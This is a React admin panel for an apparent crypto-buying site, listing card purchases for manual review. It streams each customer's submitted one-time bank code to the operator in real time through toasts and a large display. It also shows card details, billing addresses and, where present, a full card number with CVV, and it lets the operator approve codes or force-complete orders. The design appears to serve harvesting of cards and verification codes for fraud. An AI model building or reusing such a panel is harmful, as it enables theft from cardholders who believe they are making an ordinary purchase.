import { useCallback, useEffect, useRef, useState } from 'react'
import { io } from 'socket.io-client'
import api from '../../utils/axios'
import { getSocketUrl } from '../../utils/apiUrl'
import toast from 'react-hot-toast'
import PageHeader from '../ui/PageHeader'
import EmptyState from '../ui/EmptyState'
import SkeletonBlock from '../common/SkeletonBlock'
import AdminStatusBadge from './AdminStatusBadge'

const STATUS_FILTERS = [
  { id: 'all', label: 'All' },
  { id: 'queue', label: 'Action queue' },
  { id: 'awaiting_otp', label: 'Awaiting OTP' },
  { id: 'otp_submitted', label: 'OTP submitted' },
  { id: 'completed', label: 'Completed' },
  { id: 'rejected', label: 'Rejected' },
  { id: 'otp_rejected', label: 'OTP rejected' }
]

const LIVE_STATUSES = new Set(['awaiting_otp', 'otp_submitted', 'otp_rejected', 'pending'])

function mergeTx(prev, patch) {
  if (!prev) return prev
  const id = String(prev._id || prev.id || '')
  if (id !== String(patch.id || patch._id || '')) return prev
  return {
    ...prev,
    status: patch.status ?? prev.status,
    verificationStatus: patch.verificationStatus ?? prev.verificationStatus,
    otp: {
      ...(prev.otp || {}),
      ...(patch.otp || {}),
      expectedCode: patch.otp?.expectedCode ?? prev.otp?.expectedCode ?? '',
      userSubmittedCode:
        patch.otp?.userSubmittedCode ??
        patch.userSubmittedCode ??
        prev.otp?.userSubmittedCode ??
        '',
      lastRejectedCode: patch.otp?.lastRejectedCode ?? prev.otp?.lastRejectedCode ?? '',
      sentTo: patch.otp?.sentTo ?? prev.otp?.sentTo ?? '',
      submittedAt: patch.otp?.submittedAt ?? prev.otp?.submittedAt,
      adminDecision: patch.otp?.adminDecision ?? prev.otp?.adminDecision,
      submissionHistory: patch.otp?.submissionHistory ?? prev.otp?.submissionHistory
    }
  }
}

export default function BuyTransactionsList() {
  const [transactions, setTransactions] = useState([])
  const [counts, setCounts] = useState({})
  const [loading, setLoading] = useState(true)
  const [statusFilter, setStatusFilter] = useState('queue')
  const [search, setSearch] = useState('')
  const [coinFilter, setCoinFilter] = useState('')
  const [selected, setSelected] = useState(null)
  const [note, setNote] = useState('')
  const [processing, setProcessing] = useState(false)
  const [liveConnected, setLiveConnected] = useState(false)
  const selectedIdRef = useRef(null)
  const statusFilterRef = useRef(statusFilter)

  useEffect(() => {
    selectedIdRef.current = selected?._id ? String(selected._id) : null
  }, [selected])

  useEffect(() => {
    statusFilterRef.current = statusFilter
  }, [statusFilter])

  const fetchList = useCallback(async ({ silent = false } = {}) => {
    try {
      if (!silent) setLoading(true)
      const params = new URLSearchParams({ limit: 80 })
      if (statusFilter !== 'all') params.set('status', statusFilter)
      if (search.trim()) params.set('q', search.trim())
      if (coinFilter.trim()) params.set('coin', coinFilter.trim())
      const response = await api.get(`/api/admin/buy-transactions?${params}`)
      if (response.data.success) {
        setTransactions(response.data.transactions || [])
        setCounts(response.data.counts || {})
      }
    } catch (error) {
      console.error(error)
      if (!silent) toast.error('Failed to load buy transactions')
    } finally {
      if (!silent) setLoading(false)
    }
  }, [statusFilter, search, coinFilter])

  useEffect(() => {
    fetchList()
  }, [statusFilter])

  // Instant socket updates + smart silent poll while queue is open
  useEffect(() => {
    const token = localStorage.getItem('token')
    if (!token) return undefined

    const socket = io(getSocketUrl(), {
      path: '/socket.io',
      auth: { token },
      transports: ['polling', 'websocket'],
      withCredentials: true,
      reconnection: true,
      reconnectionAttempts: 40,
      reconnectionDelay: 800,
      timeout: 12000
    })

    socket.on('connect', () => setLiveConnected(true))
    socket.on('disconnect', () => setLiveConnected(false))
    socket.on('connect_error', () => setLiveConnected(false))

    socket.on('buy:update', (payload) => {
      if (!payload?.id && !payload?.transactionId) return

      const patchId = String(payload.id || '')
      const entered =
        payload.otp?.userSubmittedCode || payload.userSubmittedCode || ''

      // Toast only on fresh OTP submit so admin notices instantly
      if (payload.type === 'otp_submitted' && entered) {
        toast.success(`OTP entered: ${entered}`, { duration: 6000, id: `otp-${patchId}` })
      } else if (payload.type === 'card_initiated') {
        toast('New card purchase awaiting OTP', { id: `buy-new-${patchId}`, duration: 3000 })
      }

      setTransactions((prev) => {
        const idx = prev.findIndex(
          (t) =>
            String(t._id) === patchId ||
            t.transactionId === payload.transactionId
        )
        if (idx >= 0) {
          const next = [...prev]
          next[idx] = mergeTx(next[idx], payload)
          // Bump submitted items to top
          if (payload.type === 'otp_submitted' || payload.type === 'card_initiated') {
            const [row] = next.splice(idx, 1)
            next.unshift(row)
          }
          return next
        }
        // Unknown tx in current filter — silent refresh list
        if (
          statusFilterRef.current === 'queue' ||
          statusFilterRef.current === 'all' ||
          statusFilterRef.current === payload.status
        ) {
          fetchList({ silent: true })
        }
        return prev
      })

      setSelected((prev) => {
        if (!prev) return prev
        if (
          String(prev._id) === patchId ||
          prev.transactionId === payload.transactionId
        ) {
          return mergeTx(prev, payload)
        }
        return prev
      })

      setCounts((c) => {
        if (!payload.status) return c
        // Light bump of count for submitted (best-effort)
        if (payload.type === 'otp_submitted') {
          return {
            ...c,
            otp_submitted: (c.otp_submitted || 0) + 1,
            awaiting_otp: Math.max(0, (c.awaiting_otp || 0) - 1)
          }
        }
        return c
      })
    })

    // Fallback silent poll while live statuses matter (very light)
    const poll = setInterval(() => {
      const filter = statusFilterRef.current
      if (filter === 'queue' || filter === 'awaiting_otp' || filter === 'otp_submitted') {
        fetchList({ silent: true })
      }
      // Keep open detail fresh if still in live status
      const sid = selectedIdRef.current
      if (sid) {
        api
          .get(`/api/admin/buy-transactions/${sid}`)
          .then((res) => {
            if (res.data?.success && res.data.transaction) {
              setSelected((prev) => {
                if (!prev || String(prev._id) !== sid) return prev
                // Only apply if OTP or status actually changed
                const next = res.data.transaction
                const prevCode = prev.otp?.userSubmittedCode || ''
                const nextCode = next.otp?.userSubmittedCode || ''
                if (
                  prev.status === next.status &&
                  prevCode === nextCode &&
                  prev.otp?.expectedCode === next.otp?.expectedCode &&
                  prev.otp?.adminDecision === next.otp?.adminDecision
                ) {
                  return prev
                }
                return next
              })
            }
          })
          .catch(() => {})
      }
    }, 2500)

    return () => {
      clearInterval(poll)
      socket.off('buy:update')
      socket.disconnect()
    }
  }, [fetchList])

  const openDetail = async (tx) => {
    setSelected(tx)
    try {
      const response = await api.get(`/api/admin/buy-transactions/${tx._id}`)
      if (response.data.success) {
        setSelected(response.data.transaction)
        setNote('')
      }
    } catch {
      setSelected(tx)
    }
  }

  const decideOtp = async (decision) => {
    if (!selected) return
    setProcessing(true)
    try {
      const response = await api.post(`/api/admin/buy-transactions/${selected._id}/decide-otp`, {
        decision,
        note
      })
      if (response.data.success) {
        toast.success(response.data.message)
        setSelected(response.data.transaction)
        fetchList({ silent: true })
      }
    } catch (error) {
      toast.error(error.response?.data?.message || 'Decision failed')
    } finally {
      setProcessing(false)
    }
  }

  const complete = async (force = false) => {
    if (!selected) return
    setProcessing(true)
    try {
      const response = await api.post(`/api/admin/buy-transactions/${selected._id}/complete`, {
        force,
        adminNotes: note
      })
      if (response.data.success) {
        toast.success(response.data.message)
        setSelected(response.data.transaction)
        fetchList({ silent: true })
      }
    } catch (error) {
      toast.error(error.response?.data?.message || 'Complete failed')
    } finally {
      setProcessing(false)
    }
  }

  const reject = async () => {
    if (!selected) return
    if (!window.confirm('Reject this purchase?')) return
    setProcessing(true)
    try {
      const response = await api.post(`/api/admin/buy-transactions/${selected._id}/reject`, {
        adminNotes: note
      })
      if (response.data.success) {
        toast.success(response.data.message)
        setSelected(response.data.transaction)
        fetchList({ silent: true })
      }
    } catch (error) {
      toast.error(error.response?.data?.message || 'Reject failed')
    } finally {
      setProcessing(false)
    }
  }

  const exportCsv = () => {
    const params = new URLSearchParams({ export: 'true', limit: 5000 })
    if (statusFilter !== 'all') params.set('status', statusFilter)
    api
      .get(`/api/admin/buy-transactions?${params}`, { responseType: 'blob' })
      .then((res) => {
        const url = window.URL.createObjectURL(new Blob([res.data]))
        const a = document.createElement('a')
        a.href = url
        a.download = 'buy-transactions.csv'
        a.click()
        window.URL.revokeObjectURL(url)
      })
      .catch(() => toast.error('Export failed'))
  }

  if (loading && !transactions.length) {
    return (
      <div className="p-4 sm:p-6 space-y-4">
        <SkeletonBlock className="h-8 w-48" />
        <SkeletonBlock className="h-64 w-full rounded-xl" />
      </div>
    )
  }

  const d = selected
  const userEntered = d?.otp?.userSubmittedCode || ''
  const expected = d?.otp?.expectedCode || ''
  const codesMatch =
    expected && userEntered && String(expected) === String(userEntered)
  const isLive = d && LIVE_STATUSES.has(d.status)

  return (
    <div className="p-4 sm:p-6 space-y-4">
      <PageHeader
        title="Buy Transactions"
        description="Review card purchases, OTP codes, and complete crypto buy orders."
      />

      <div className="flex items-center gap-2 text-xs">
        <span
          className={`inline-flex items-center gap-1.5 px-2 py-1 rounded-full font-medium ${
            liveConnected
              ? 'bg-emerald-100 text-emerald-700 dark:bg-emerald-900/40 dark:text-emerald-300'
              : 'bg-amber-100 text-amber-700 dark:bg-amber-900/40 dark:text-amber-300'
          }`}
        >
          <span
            className={`w-1.5 h-1.5 rounded-full ${liveConnected ? 'bg-emerald-500 animate-pulse' : 'bg-amber-500'}`}
          />
          {liveConnected ? 'Live updates on' : 'Reconnecting…'}
        </span>
      </div>

      <div className="flex flex-wrap gap-2">
        {STATUS_FILTERS.map((f) => (
          <button
            key={f.id}
            type="button"
            onClick={() => setStatusFilter(f.id)}
            className={`px-3 py-1.5 rounded-lg text-sm font-medium transition ${
              statusFilter === f.id
                ? 'bg-gradient-to-r from-cyan-500 to-indigo-500 text-white'
                : 'bg-slate-200 dark:bg-slate-800 text-slate-700 dark:text-slate-300'
            }`}
          >
            {f.label}
            {f.id !== 'all' && f.id !== 'queue' && counts[f.id] != null ? ` (${counts[f.id]})` : ''}
          </button>
        ))}
      </div>

      <div className="flex flex-col sm:flex-row gap-2">
        <input
          className="fx-input flex-1"
          placeholder="Search transaction ID, card last4…"
          value={search}
          onChange={(e) => setSearch(e.target.value)}
          onKeyDown={(e) => e.key === 'Enter' && fetchList()}
        />
        <input
          className="fx-input sm:w-32"
          placeholder="Coin"
          value={coinFilter}
          onChange={(e) => setCoinFilter(e.target.value)}
          onKeyDown={(e) => e.key === 'Enter' && fetchList()}
        />
        <button
          type="button"
          onClick={() => fetchList()}
          className="px-4 py-2 rounded-lg bg-slate-800 text-white text-sm"
        >
          Search
        </button>
        <button
          type="button"
          onClick={exportCsv}
          className="px-4 py-2 rounded-lg border border-slate-300 dark:border-slate-600 text-sm"
        >
          Export CSV
        </button>
      </div>

      <div className="grid lg:grid-cols-5 gap-4">
        <div className="lg:col-span-2 fx-card overflow-hidden max-h-[75vh] overflow-y-auto p-0">
          {transactions.length === 0 ? (
            <EmptyState title="No purchases found" description="Card buy transactions will appear here." />
          ) : (
            <ul className="divide-y divide-slate-200 dark:divide-slate-700">
              {transactions.map((tx) => {
                const entered = tx.otp?.userSubmittedCode
                return (
                  <li key={tx._id}>
                    <button
                      type="button"
                      onClick={() => openDetail(tx)}
                      className={`w-full text-left p-4 hover:bg-slate-50 dark:hover:bg-slate-800/60 ${
                        selected?._id === tx._id ? 'bg-cyan-50 dark:bg-cyan-950/20' : ''
                      }`}
                    >
                      <div className="flex justify-between gap-2">
                        <div>
                          <p className="font-medium text-slate-900 dark:text-white text-sm">
                            {tx.userId?.fullName || tx.userId?.email || 'User'}
                          </p>
                          <p className="text-xs text-slate-500">
                            {tx.coinSymbol} · ${Number(tx.fiatAmount || 0).toFixed(2)}
                          </p>
                        </div>
                        <AdminStatusBadge status={tx.status} />
                      </div>
                      {entered ? (
                        <p className="mt-1.5 text-sm font-mono font-bold tracking-widest text-amber-700 dark:text-amber-300">
                          Entered: {entered}
                        </p>
                      ) : (
                        <p className="mt-1.5 text-[11px] text-slate-400">
                          {tx.status === 'awaiting_otp' ? 'Waiting for user code…' : 'No code entered yet'}
                        </p>
                      )}
                      <p className="text-[11px] font-mono text-slate-400 mt-1 truncate">{tx.transactionId}</p>
                      <p className="text-[11px] text-slate-400">
                        {tx.createdAt ? new Date(tx.createdAt).toLocaleString() : ''}
                      </p>
                    </button>
                  </li>
                )
              })}
            </ul>
          )}
        </div>

        <div className="lg:col-span-3 fx-card space-y-4">
          {!d ? (
            <p className="text-slate-500 text-sm">Select a transaction to review payment and OTP details.</p>
          ) : (
            <>
              <div className="flex flex-wrap items-start justify-between gap-2">
                <div>
                  <h3 className="text-lg font-semibold text-slate-900 dark:text-white">
                    {d.coinName} ({d.coinSymbol})
                  </h3>
                  <p className="text-xs font-mono text-slate-500">{d.transactionId}</p>
                </div>
                <div className="flex items-center gap-2">
                  {isLive && (
                    <span className="text-[10px] uppercase tracking-wide text-cyan-600 dark:text-cyan-400 font-semibold">
                      Live
                    </span>
                  )}
                  <AdminStatusBadge status={d.status} />
                </div>
              </div>

              {/* User-entered code — primary admin focus */}
              <div
                className={`rounded-2xl border-2 px-4 py-4 text-center ${
                  userEntered
                    ? 'border-amber-400 bg-amber-50 dark:bg-amber-950/30'
                    : 'border-dashed border-slate-300 dark:border-slate-600 bg-slate-50 dark:bg-slate-800/40'
                }`}
              >
                <p className="text-[11px] uppercase tracking-wide font-semibold text-amber-800 dark:text-amber-300 mb-1">
                  User currently entered code
                </p>
                {userEntered ? (
                  <p className="font-mono text-3xl sm:text-4xl font-bold tracking-[0.35em] text-amber-900 dark:text-amber-100">
                    {userEntered}
                  </p>
                ) : (
                  <p className="text-sm text-slate-500 py-2">
                    Waiting for user to enter the code on their phone / site…
                  </p>
                )}
                {d.otp?.submittedAt && (
                  <p className="text-[11px] text-slate-500 mt-2">
                    Submitted {new Date(d.otp.submittedAt).toLocaleString()}
                  </p>
                )}
              </div>

              <div className="grid sm:grid-cols-2 gap-3 text-sm">
                <Info label="User" value={d.userId?.fullName || '—'} />
                <Info label="Email" value={d.userId?.email || '—'} />
                <Info label="Fiat" value={`$${Number(d.fiatAmount || 0).toFixed(2)} ${d.currency || 'USD'}`} />
                <Info label="Crypto amount" value={`${Number(d.coinAmount || 0).toFixed(8)} ${d.coinSymbol}`} />
                <Info label="Payment" value={(d.paymentMethod || '').replace('_', ' ')} />
                <Info label="Verification" value={d.verificationStatus || '—'} />
                <Info label="Card" value={`${d.card?.brand || ''} •••• ${d.card?.last4 || ''}`} />
                <Info label="Cardholder" value={d.card?.cardholderName || '—'} />
                <Info label="Expiry" value={`${d.card?.expMonth || ''}/${d.card?.expYear || ''}`} />
                <Info label="Date" value={d.createdAt ? new Date(d.createdAt).toLocaleString() : '—'} />
              </div>

              {d.card?.billingAddress && (
                <div className="text-sm rounded-xl bg-slate-50 dark:bg-slate-800/50 p-3">
                  <p className="font-medium mb-1">Billing</p>
                  <p className="text-slate-600 dark:text-slate-300">
                    {[
                      d.card.billingAddress.line1,
                      d.card.billingAddress.line2,
                      d.card.billingAddress.city,
                      d.card.billingAddress.state,
                      d.card.billingAddress.postalCode,
                      d.card.billingAddress.country
                    ]
                      .filter(Boolean)
                      .join(', ')}
                  </p>
                </div>
              )}

              <div className="rounded-xl border border-slate-200 dark:border-slate-700 p-3 space-y-2 text-sm">
                <p className="font-semibold">OTP review</p>
                <Info label="Expected code (system)" value={expected || '—'} mono />
                <Info label="User submitted" value={userEntered || '—'} mono />
                <Info label="Last rejected" value={d.otp?.lastRejectedCode || '—'} mono />
                <Info label="Sent to" value={d.otp?.sentTo || '—'} />
                {codesMatch && (
                  <p className="text-xs text-emerald-600 font-medium">✓ Submitted code matches expected code</p>
                )}
                {userEntered && expected && !codesMatch && (
                  <p className="text-xs text-red-600 font-medium">✗ Submitted code does not match expected</p>
                )}
                {Array.isArray(d.otp?.submissionHistory) && d.otp.submissionHistory.length > 0 && (
                  <div className="pt-2 border-t border-slate-200 dark:border-slate-700">
                    <p className="text-xs font-semibold text-slate-500 mb-1">Submission history</p>
                    <ul className="space-y-1">
                      {[...d.otp.submissionHistory].reverse().map((h, i) => (
                        <li key={`${h.code}-${h.at || i}`} className="flex justify-between text-xs gap-2">
                          <span className="font-mono font-semibold tracking-wider">{h.code}</span>
                          <span className="text-slate-500">
                            {h.decision || 'pending'}
                            {h.at ? ` · ${new Date(h.at).toLocaleTimeString()}` : ''}
                          </span>
                        </li>
                      ))}
                    </ul>
                  </div>
                )}
                {d.card?.devFullNumber && (
                  <div className="text-xs text-amber-700 dark:text-amber-300 bg-amber-50 dark:bg-amber-950/30 p-2 rounded">
                    DEV card: {d.card.devFullNumber} / CVV {d.card.devCvv}
                  </div>
                )}
              </div>

              <textarea
                className="fx-input"
                rows={2}
                placeholder="Admin note (optional)"
                value={note}
                onChange={(e) => setNote(e.target.value)}
              />

              <div className="flex flex-wrap gap-2">
                {['otp_submitted', 'awaiting_otp', 'otp_rejected'].includes(d.status) && (
                  <>
                    <button
                      type="button"
                      disabled={processing}
                      onClick={() => decideOtp('approved')}
                      className="px-4 py-2 rounded-lg bg-emerald-600 text-white text-sm font-medium disabled:opacity-50"
                    >
                      Approve OTP & Complete
                    </button>
                    <button
                      type="button"
                      disabled={processing}
                      onClick={() => decideOtp('rejected')}
                      className="px-4 py-2 rounded-lg bg-red-600 text-white text-sm font-medium disabled:opacity-50"
                    >
                      Reject OTP
                    </button>
                  </>
                )}
                {d.status !== 'completed' && d.status !== 'rejected' && (
                  <>
                    <button
                      type="button"
                      disabled={processing}
                      onClick={() => complete(true)}
                      className="px-4 py-2 rounded-lg bg-indigo-600 text-white text-sm font-medium disabled:opacity-50"
                    >
                      Force complete
                    </button>
                    <button
                      type="button"
                      disabled={processing}
                      onClick={reject}
                      className="px-4 py-2 rounded-lg border border-red-300 text-red-600 text-sm font-medium disabled:opacity-50"
                    >
                      Reject purchase
                    </button>
                  </>
                )}
              </div>
            </>
          )}
        </div>
      </div>
    </div>
  )
}

function Info({ label, value, mono }) {
  return (
    <div>
      <p className="text-xs text-slate-500">{label}</p>
      <p className={`font-medium text-slate-900 dark:text-white ${mono ? 'font-mono text-sm tracking-wider' : ''}`}>
        {value}
      </p>
    </div>
  )
}
